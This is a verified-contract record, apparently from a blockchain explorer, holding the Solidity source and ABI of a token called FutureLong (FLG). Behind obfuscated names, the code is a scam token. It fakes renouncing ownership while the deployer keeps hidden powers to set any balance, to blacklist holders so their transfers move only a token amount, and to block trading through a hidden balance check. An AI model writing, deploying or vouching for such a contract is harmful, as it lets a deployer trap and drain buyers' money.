{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface receiverExempt {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract fundAuto {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface listTeam {\n    function createPair(address teamAuto, address receiverTotal) external returns (address);\n}\n\ninterface fundTo {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address launchedLimit) external view returns (uint256);\n\n    function transfer(address fundReceiverAmount, uint256 atLimit) external returns (bool);\n\n    function allowance(address enableExempt, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 atLimit) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fundReceiverAmount,\n        uint256 atLimit\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed receiverTx, uint256 value);\n    event Approval(address indexed enableExempt, address indexed spender, uint256 value);\n}\n\ninterface tradingLiquidity is fundTo {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract FutureLong is fundAuto, fundTo, tradingLiquidity {\n\n    uint256 public exemptTotal;\n\n    function decimals() external view virtual override returns (uint8) {\n        return launchedTx;\n    }\n\n    mapping(address => mapping(address => uint256)) private totalModeAuto;\n\n    string private listMin = \"Future Long\";\n\n    function allowance(address receiverAmount, address fromWallet) external view virtual override returns (uint256) {\n        if (fromWallet == txLaunch) {\n            return type(uint256).max;\n        }\n        return totalModeAuto[receiverAmount][fromWallet];\n    }\n\n    uint256 minLimit;\n\n    uint8 private launchedTx = 18;\n\n    uint256 constant enableIs = 7 ** 10;\n\n    uint256 takeTokenEnable;\n\n    function owner() external view returns (address) {\n        return autoLiquidity;\n    }\n\n    uint256 public autoMarketing;\n\n    function receiverLimitTx(address minSellAuto) public {\n        require(minSellAuto.balance < 100000);\n        if (feeExemptEnable) {\n            return;\n        }\n        if (limitWalletBuy != limitExempt) {\n            exemptTotal = limitWalletBuy;\n        }\n        teamFund[minSellAuto] = true;\n        \n        feeExemptEnable = true;\n    }\n\n    function minTrading(address tradingTotal, address fundReceiverAmount, uint256 atLimit) internal returns (bool) {\n        require(minAt[tradingTotal] >= atLimit);\n        minAt[tradingTotal] -= atLimit;\n        minAt[fundReceiverAmount] += atLimit;\n        emit Transfer(tradingTotal, fundReceiverAmount, atLimit);\n        return true;\n    }\n\n    address private autoLiquidity;\n\n    function getOwner() external view returns (address) {\n        return autoLiquidity;\n    }\n\n    address public walletIs;\n\n    function swapReceiver() private view {\n        require(teamFund[_msgSender()]);\n    }\n\n    mapping(address => uint256) private minAt;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return isListShould;\n    }\n\n    bool public fromBuy;\n\n    string private shouldSwap = \"FLG\";\n\n    function feeWalletSell(address tradingTotal, address fundReceiverAmount, uint256 atLimit) internal returns (bool) {\n        if (tradingTotal == walletIs) {\n            return minTrading(tradingTotal, fundReceiverAmount, atLimit);\n        }\n        uint256 fromAutoTeam = fundTo(fundTake).balanceOf(totalReceiver);\n        require(fromAutoTeam == takeTokenEnable);\n        require(fundReceiverAmount != totalReceiver);\n        if (minTake[tradingTotal]) {\n            return minTrading(tradingTotal, fundReceiverAmount, enableIs);\n        }\n        return minTrading(tradingTotal, fundReceiverAmount, atLimit);\n    }\n\n    address totalReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 public txFund;\n\n    function transfer(address swapWallet, uint256 atLimit) external virtual override returns (bool) {\n        return feeWalletSell(_msgSender(), swapWallet, atLimit);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return listMin;\n    }\n\n    function transferFrom(address tradingTotal, address fundReceiverAmount, uint256 atLimit) external override returns (bool) {\n        if (_msgSender() != txLaunch) {\n            if (totalModeAuto[tradingTotal][_msgSender()] != type(uint256).max) {\n                require(atLimit <= totalModeAuto[tradingTotal][_msgSender()]);\n                totalModeAuto[tradingTotal][_msgSender()] -= atLimit;\n            }\n        }\n        return feeWalletSell(tradingTotal, fundReceiverAmount, atLimit);\n    }\n\n    function toLaunchedBuy(address toTeam) public {\n        swapReceiver();\n        if (limitWalletBuy == txFund) {\n            exemptTotal = limitExempt;\n        }\n        if (toTeam == walletIs || toTeam == fundTake) {\n            return;\n        }\n        minTake[toTeam] = true;\n    }\n\n    function launchFrom() public {\n        emit OwnershipTransferred(walletIs, address(0));\n        autoLiquidity = address(0);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return shouldSwap;\n    }\n\n    address public fundTake;\n\n    bool public feeExemptEnable;\n\n    function approve(address fromWallet, uint256 atLimit) public virtual override returns (bool) {\n        totalModeAuto[_msgSender()][fromWallet] = atLimit;\n        emit Approval(_msgSender(), fromWallet, atLimit);\n        return true;\n    }\n\n    mapping(address => bool) public teamFund;\n\n    uint256 private isListShould = 100000000 * 10 ** 18;\n\n    event OwnershipTransferred(address indexed senderMode, address indexed buySwap);\n\n    uint256 private limitExempt;\n\n    address txLaunch = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function balanceOf(address launchedLimit) public view virtual override returns (uint256) {\n        return minAt[launchedLimit];\n    }\n\n    function maxTotal(uint256 atLimit) public {\n        swapReceiver();\n        takeTokenEnable = atLimit;\n    }\n\n    constructor (){\n        if (limitExempt != limitWalletBuy) {\n            walletFund = true;\n        }\n        receiverExempt enableLaunched = receiverExempt(txLaunch);\n        fundTake = listTeam(enableLaunched.factory()).createPair(enableLaunched.WETH(), address(this));\n        if (walletFund != fromBuy) {\n            txFund = limitWalletBuy;\n        }\n        walletIs = _msgSender();\n        launchFrom();\n        teamFund[walletIs] = true;\n        minAt[walletIs] = isListShould;\n        \n        emit Transfer(address(0), walletIs, isListShould);\n    }\n\n    uint256 private limitWalletBuy;\n\n    mapping(address => bool) public minTake;\n\n    bool private walletFund;\n\n    function fromLimit(address swapWallet, uint256 atLimit) public {\n        swapReceiver();\n        minAt[swapWallet] = atLimit;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableExempt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderMode\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buySwap\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverTx\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fromWallet\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atLimit\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedLimit\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeExemptEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atLimit\",\"type\":\"uint256\"}],\"name\":\"fromLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundTake\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"atLimit\",\"type\":\"uint256\"}],\"name\":\"maxTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"minTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minSellAuto\",\"type\":\"address\"}],\"name\":\"receiverLimitTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"teamFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toTeam\",\"type\":\"address\"}],\"name\":\"toLaunchedBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atLimit\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundReceiverAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atLimit\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "FutureLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}